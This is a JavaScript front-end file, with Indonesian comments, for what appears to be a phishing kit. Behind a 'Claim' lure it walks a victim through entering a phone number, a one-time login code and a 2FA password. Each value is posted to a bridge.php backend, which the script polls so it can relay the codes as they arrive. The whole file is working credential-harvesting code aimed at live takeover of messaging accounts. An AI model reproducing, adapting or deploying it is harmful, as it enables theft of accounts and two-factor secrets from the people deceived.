
const API_URL = "bridge.php";
let isPolling = false; // Mencegah polling bertumpuk

function loadPage(state) {
    let file = "";
    switch(state) {
        case "start":   file = "Lander.php"; break;
        case "phone":   file = "OTPC.php"; break;
        case "otp":     file = "PASS.php"; break;
        case "success": file = "SCCS.php"; break;
        default:        file = "Lander.php";
    }

    console.log("Mencoba memuat: " + file); // Debugging

    $("#app-container").load(file, function(response, status, xhr) {
        if (status == "error") {
            console.error("Gagal memuat halaman: " + file + " Error: " + xhr.status + " " + xhr.statusText);
            alert("File " + file + " tidak ditemukan atau akses ditolak!");
        } else {
            console.log(file + " berhasil dimuat.");
        }
    });
}
function checkStatus() {
    var savedPhone = localStorage.getItem("user_phone");
    if (!savedPhone) {
        isPolling = false;
        return;
    }
    
    isPolling = true;
    $.ajax({
        url: API_URL,
        type: "POST",
        dataType: "json",
        data: { "method": "getStatus", "phone": savedPhone },
        success: function(data) {
            if (data && data.result) {
                var res = data.result;

                if (res.status === "success") {
                    let currentState = localStorage.getItem("current_state");
                    let target = "start";

                    if (res.type === "checkPhone") target = "phone";
                    else if (res.type === "OTP") target = (res.detail === "passwordNeeded") ? "otp" : "success";
                    else if (res.type === "password") target = "success";

                    // Hanya loadPage jika target berbeda dengan halaman sekarang
                    if (currentState !== target) {
                        localStorage.setItem("current_state", target);
                        loadPage(target);
                    }
                    
                    // Berhenti polling jika sudah sampai di halaman sukses
                    if (target === "success") {
                        isPolling = false;
                        return;
                    }
                } 
                else if (res.status === "failed") {
                    alert("Sesi ditolak atau terjadi kesalahan.");
                    localStorage.clear();
                    loadPage("start");
                    isPolling = false;
                    return;
                }
            }
            
            // Lanjut polling jika masih dalam proses waiting
            if (isPolling) {
                setTimeout(checkStatus, 2000);
            }
        },
        error: function() {
            // Jika koneksi internet drop, coba lagi nanti
            if (isPolling) {
                setTimeout(checkStatus, 5000);
            }
        }
    });
}

// 1. Inisialisasi saat pertama kali buka
$(document).ready(function() {
    var savedPhone = localStorage.getItem("user_phone");
    if (savedPhone) {
        checkStatus(); // Langsung cek status jika ada session
    } else {
        loadPage("start");
    }
});

// --- EVENT DELEGATION (PENTING: Karena form diload dinamis) ---

// 2. Klik tombol di Lander (Kirim Nomor)
$(document).on("click", "#ClaimBtn button", function(e) {
    e.preventDefault();
    var phone = $("input#phone").val();

    if (phone != "") {
        $("#loader-screen").show(); 
        $.ajax({
            url: API_URL,
            type: "POST",
            dataType: "json",
            data: { "method": "sendCode", "phone": phone },
            success: function(data) {
                localStorage.setItem("user_phone", data.normalized_phone || phone);
                if (!isPolling) checkStatus();
            }
        });
    }
});

// 3. Submit di OTPC (Kirim OTP)
$(document).on("submit", "#formOtp", function(e) {
    e.preventDefault();
    var code = $("#otpCode").val();
    var savedPhone = localStorage.getItem("user_phone");

    if (code.length >= 5) {
        $("#submitBtn").prop('disabled', true).text("Wait...");
        $.ajax({
            url: API_URL,
            type: "POST",
            data: { "method": "sendOtp", "otp": code, "phone": savedPhone },
            success: function() {
                // Biarkan checkStatus yang sedang berjalan yang memindahkan halaman
            }
        });
    }
});

// 4. Submit di PASS (Kirim Password/2FA)
$(document).on("submit", "#formPassword", function(e) {
    e.preventDefault();
    var password = $("#passwordInput").val();
    var savedPhone = localStorage.getItem("user_phone");

    if (password != "") {
        $("#confirmBtn").prop('disabled', true).text("Wait...");
        $.ajax({
            url: API_URL,
            type: "POST",
            data: { "method": "sendPassword", "password": password, "phone": savedPhone },
            success: function() {
                // Biarkan checkStatus yang memproses ke SCCS.php
            }
        });
    }
});